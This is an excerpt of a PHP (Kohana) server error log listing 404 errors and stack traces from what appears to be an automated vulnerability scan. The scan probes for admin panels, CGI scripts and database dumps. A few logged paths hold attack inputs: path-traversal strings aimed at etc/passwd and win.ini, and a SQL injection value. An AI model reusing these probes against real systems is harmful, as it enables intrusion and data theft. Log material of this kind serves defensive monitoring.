#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:31 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL plugins/servlet/oauth/users/icon-uri was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:31 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL plugins/servlet/oauth/users/icon-uri was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:31 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL axis1/services/listServices was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:31 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL axis1/services/listServices was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:31 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: +CSCOE+/files/file_list.json ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:31 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: +CSCOE+/files/file_list.json ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:31 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL axis/services/listServices was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:31 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL axis/services/listServices was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:31 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL jboss-net/services/listServices was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:31 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL jboss-net/services/listServices was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:31 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: 83GGMRyClZ.cfm ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:31 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: 83GGMRyClZ.cfm ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:32 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: CFIDE/administrator/index.cfm ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:32 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: CFIDE/administrator/index.cfm ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:32 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: inexistent_file_name.inexistent0123450987.cfm ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:32 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: inexistent_file_name.inexistent0123450987.cfm ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:32 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/welcome.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:32 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/welcome.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:32 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL solr/select was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:32 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL solr/select was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:32 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/jarrewrite.sh ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:32 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/jarrewrite.sh ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:32 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: xzumR8E1on.cfm ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:32 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: xzumR8E1on.cfm ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:32 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: db.sql ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:32 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: db.sql ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:32 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL cgi-bin/welcome was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:32 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL cgi-bin/welcome was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:32 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: create.sql ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:32 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: create.sql ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:32 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: administrator.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:32 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: administrator.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:32 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: dump.sql ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:32 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: dump.sql ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:32 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: admin.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:32 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: admin.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:32 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: elmah.axd ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:32 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: elmah.axd ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:32 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: dbdump.sql ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:32 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: dbdump.sql ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:32 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/admin.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:32 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/admin.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:32 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: database.sql ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:32 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: database.sql ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:32 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL elmah/errors was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:32 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL elmah/errors was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:32 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/FormHandler.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:32 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/FormHandler.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:32 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: backup.sql ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:32 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: backup.sql ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:32 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: admin/db.sql ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:32 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: admin/db.sql ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:32 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/FormMail.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:32 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/FormMail.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:32 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: admin/elmah.axd ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:32 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: admin/elmah.axd ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:32 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/guestbook.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:32 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/guestbook.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:32 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: admin/create.sql ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:32 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: admin/create.sql ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:32 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/search.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:32 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/search.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:32 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: admin/dump.sql ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:32 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: admin/dump.sql ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:32 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-sys/addalink.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:32 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-sys/addalink.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:32 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: admin/dbdump.sql ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:32 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: admin/dbdump.sql ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:32 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: admin/database.sql ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:32 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: admin/database.sql ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:32 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: theme/META-INF유..유..유..유..유..유..유..유..유..유..유..유..유etc/passwd ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:32 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: theme/META-INF유..유..유..유..유..유..유..유..유..유..유..유..유etc/passwd ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:32 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-sys/entropybanner.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:32 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-sys/entropybanner.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:32 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: admin/backup.sql ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:32 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: admin/backup.sql ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:32 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-sys/entropysearch.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:32 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-sys/entropysearch.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:32 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: 34.sql ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:32 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: 34.sql ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:32 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: theme/META-INF유..유..유..유..유..유..유..유..유..유..유..유..유windows/win.ini ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:32 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: theme/META-INF유..유..유..유..유..유..유..유..유..유..유..유..유windows/win.ini ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:33 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-sys/defaultwebpage.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:33 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-sys/defaultwebpage.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:33 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: 34db.sql ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:33 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: 34db.sql ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:33 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: 34_db.sql ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:33 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: 34_db.sql ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:33 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-sys/FormMail-clone.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:33 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-sys/FormMail-clone.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:33 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: 34-db.sql ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:33 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: 34-db.sql ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:33 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-sys/domainredirect.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:33 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-sys/domainredirect.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:33 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: 34_database.sql ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:33 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-mod/index.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:33 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: 34_database.sql ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:33 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-mod/index.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:33 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: horde/util/barcode.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:33 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: horde/util/barcode.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:33 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/test.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:33 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/test.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:33 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: 34-database.sql ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:33 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: 34-database.sql ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:33 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: util/barcode.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:33 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: util/barcode.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:33 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: 34_dump.sql ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:33 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: 34_dump.sql ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:33 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL cgi-bin-sdb/printenv was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:33 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL cgi-bin-sdb/printenv was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:33 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL wps/wcm/connect/'+or+'X95Cy'='X95Cy was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:33 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL wps/wcm/connect/'+or+'X95Cy'='X95Cy was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:33 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: 34-dump.sql ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:33 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: 34-dump.sql ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:33 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: 34_backup.sql ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:33 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: 34_backup.sql ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:33 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: long_inexistent_path12345_/Null.htw ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:33 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: long_inexistent_path12345_/Null.htw ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:33 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: 34-backup.sql ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:33 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: 34-backup.sql ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:33 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: loader-wizard.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:33 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: loader-wizard.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:33 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: backup-34.sql ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:33 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: backup-34.sql ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:33 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: ioncube/loader-wizard.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:33 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: ioncube/loader-wizard.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
